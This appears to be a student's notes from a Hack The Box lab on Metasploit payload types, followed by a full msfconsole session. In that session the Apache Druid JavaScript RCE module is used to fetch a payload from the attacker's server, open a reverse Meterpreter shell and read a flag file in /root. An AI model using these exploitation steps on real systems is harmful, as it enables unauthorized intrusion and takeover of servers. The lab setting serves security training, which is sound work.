
## Payloads

- A `Payload` in Metasploit refers to a module that helps the `exploit` module returning a shell to a attacker.
- The payloads and exploits are used together to bypass the standard functionality/working of the vulnerable service.

### Singles 

- A `Single` payload contains the entire exploit and shellcode for the selected task.
- Its more stable because it contains everything all-in-one.

### Stagers

- `Stagers` work with `Stage` payloads to perform a specific task.
- `Stager` runs on a victim machine and initiates an outbound connection to the attacker's listener.

### Stages

- `Stages` are payload components downloaded by the `Stager` modules as per the `Stager` payload.

---
## Questions and Solutions

- Exploit the Apache Druid service and find the flag.txt file. Submit the contents of this file as the answer.
	- **HTB{redacted}**


### Steps to Reproduce

```bash
$ msfconsole
msf > search druid

Matching Modules
================

   #   Name                                            Disclosure Date  Rank       Check  Description
   -   ----                                            ---------------  ----       -----  -----------
   0   exploit/linux/http/apache_druid_js_rce          2021-01-21       excellent  Yes    Apache Druid 0.20.0 Remote Command Execution
   1     \_ target: Linux (dropper)                    .                .          .      .
   2     \_ target: Unix (in-memory)                   .                .          .      .
   3   exploit/multi/http/apache_druid_cve_2023_25194  2023-02-07       excellent  Yes    Apache Druid JNDI Injection RCE
   4     \_ target: Automatic                          .                .          .      .
   5     \_ target: Windows                            .                .          .      .
   6     \_ target: Linux                              .                .          .      .
   7   auxiliary/spoof/dns/bailiwicked_domain          2008-07-21       normal     Yes    DNS BailiWicked Domain Attack
   8   auxiliary/spoof/dns/bailiwicked_host            2008-07-21       normal     Yes    DNS BailiWicked Host Attack
   9   auxiliary/scanner/http/log4shell_scanner        2021-12-09       normal     No     Log4Shell HTTP Scanner
   10    \_ AKA: Log4Shell                             .                .          .      .
   11    \_ AKA: LogJam                                .                .          .      .
   12  exploit/solaris/sunrpc/ypupdated_exec           1994-12-12       excellent  No     Solaris ypupdated Command Execution
   13  exploit/solaris/dialup/manyargs                 2001-12-12       good       No     System V Derived /bin/login Extraneous Arguments Buffer Overflow
   14  auxiliary/scanner/telephony/wardial             .                normal     No     Wardialer


Interact with a module by name or index. For example info 14, use 14 or use auxiliary/scanner/telephony/wardial
msf > use 0
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf exploit(linux/http/apache_druid_js_rce) > set RHOSTS 10.129.203.52
RHOSTS => 10.129.203.52
msf exploit(linux/http/apache_druid_js_rce) > set LHOST 10.10.15.64
LHOST => 10.10.15.64
msf exploit(linux/http/apache_druid_js_rce) > show options

Module options (exploit/linux/http/apache_druid_js_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, http, socks5h
   RHOSTS     10.129.203.52    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      8888             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The base path of Apache Druid
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.15.64      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux (dropper)



View the full module info with the info, or info -d command.

msf exploit(linux/http/apache_druid_js_rce) > run
[*] Started reverse TCP handler on 10.10.15.64:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Using URL: http://10.10.15.64:8080/cWuzYtgKRX7tqp
[*] Client 10.129.203.52 (curl/7.68.0) requested /cWuzYtgKRX7tqp
[*] Sending payload to 10.129.203.52 (curl/7.68.0)
[*] Sending stage (3090404 bytes) to 10.129.203.52
[*] Command Stager progress - 100.00% done (118/118 bytes)
[*] Meterpreter session 1 opened (10.10.15.64:4444 -> 10.129.203.52:60640) at 2026-03-05 02:16:59 -0500
[*] Server stopped.

meterpreter > meterpreter > ls
Listing: /root/druid
====================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100644/rw-r--r--  59403  fil   2020-03-30 21:52:05 -0400  LICENSE
100644/rw-r--r--  69091  fil   2020-03-30 21:52:06 -0400  NOTICE
100644/rw-r--r--  8228   fil   2020-03-30 21:54:43 -0400  README
040755/rwxr-xr-x  4096   dir   2022-05-16 04:45:00 -0400  bin
040755/rwxr-xr-x  4096   dir   2022-05-11 08:49:31 -0400  conf
040755/rwxr-xr-x  4096   dir   2022-05-11 08:49:30 -0400  extensions
040755/rwxr-xr-x  4096   dir   2022-05-11 08:49:30 -0400  hadoop-dependencies
040755/rwxr-xr-x  12288  dir   2022-05-11 08:49:32 -0400  lib
040755/rwxr-xr-x  4096   dir   2020-03-30 21:26:02 -0400  licenses
040755/rwxr-xr-x  4096   dir   2022-05-11 08:49:31 -0400  quickstart
040755/rwxr-xr-x  4096   dir   2022-05-11 09:09:18 -0400  var

meterpreter > pwd
/root/druid
meterpreter > cd ..
meterpreter > ls
Listing: /root
==============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100600/rw-------  168   fil   2022-05-16 07:07:41 -0400  .bash_history
100644/rw-r--r--  3137  fil   2022-05-11 09:43:25 -0400  .bashrc
040700/rwx------  4096  dir   2022-05-16 07:04:45 -0400  .cache
040700/rwx------  4096  dir   2022-05-16 06:54:48 -0400  .config
100644/rw-r--r--  161   fil   2019-12-05 09:39:21 -0500  .profile
100644/rw-r--r--  75    fil   2022-05-16 04:45:33 -0400  .selected_editor
040700/rwx------  4096  dir   2021-10-06 13:37:09 -0400  .ssh
100644/rw-r--r--  212   fil   2022-05-11 10:10:43 -0400  .wget-hsts
040755/rwxr-xr-x  4096  dir   2022-05-11 08:51:45 -0400  druid
100755/rwxr-xr-x  95    fil   2022-05-16 06:31:10 -0400  druid.sh
100644/rw-r--r--  22    fil   2022-05-16 06:01:15 -0400  flag.txt
040755/rwxr-xr-x  4096  dir   2021-10-06 13:37:19 -0400  snap

meterpreter > cat flag.txt
HTB{redacted}
```

